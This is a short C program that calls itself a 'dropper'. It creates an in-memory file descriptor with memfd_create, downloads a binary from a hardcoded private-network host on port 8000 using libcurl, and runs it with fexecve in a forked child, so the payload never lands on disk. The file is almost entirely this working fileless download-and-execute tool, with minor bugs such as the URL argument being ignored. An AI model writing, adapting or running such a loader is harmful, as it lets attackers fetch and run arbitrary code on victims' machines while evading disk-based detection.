/*Golang being annoying with syscalls. Working around issue in C*/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>  
#include <string.h>     
#include <sys/socket.h>
#include <arpa/inet.h> 
#include <sys/mman.h>
#include <curl/curl.h>

int create_memfd(char* fd_name){
    int fd;
    printf("[+] Creating memfd\n");
    fd = memfd_create(fd_name, 0);
    if (fd == -1) {
        perror("memfd_create\n");
        exit(0);
    }
    printf("[+] fd is %d\n", fd);
    return fd;
}


void write_file(char* url, long port, char* filepath) {
    CURL *curl;
    FILE *fp;
    CURLcode res;
    char outfilename[100];
    strcpy(outfilename, filepath);

    curl = curl_easy_init();                                                                                                                                                                                                                                                           
    if (curl) {   
        fp = fopen(outfilename,"wb");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        // curl_easy_setopt(curl, CURLOPT_PORT, port);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);
    }   
    return;
}


void exec_fd(int fd, char* evp[]){
    printf("[+] Executing file\n");
    pid_t pid = fork();
    if(pid == 0){
        char fname[128];
        int j = snprintf(fname, 128, "/proc/self/fd/%d", fd);
        char* p_argv[] = {fname, NULL};
        fexecve(fd, p_argv, evp);
    }
    return;
}


int main(int argc, char *argv[], char * envp[]){
    char* fd_name = "psovaya";
    int fd_num;
    char* url = "http://192.168.1.188:8000/helloworld";
    char fd_path[128];
    char* usage = "Usage : ./dropper {url}\n";

    // User Input
    if (argc != 2) {
        printf("Error : Incorrect count of Arguements\n%s", usage);
    }

    fd_num = create_memfd(fd_name);
    int j = snprintf(fd_path, 128, "/proc/self/fd/%d", fd_num);
    write_file(url, 8000, fd_path);
    exec_fd(fd_num, envp);
    return 0;
}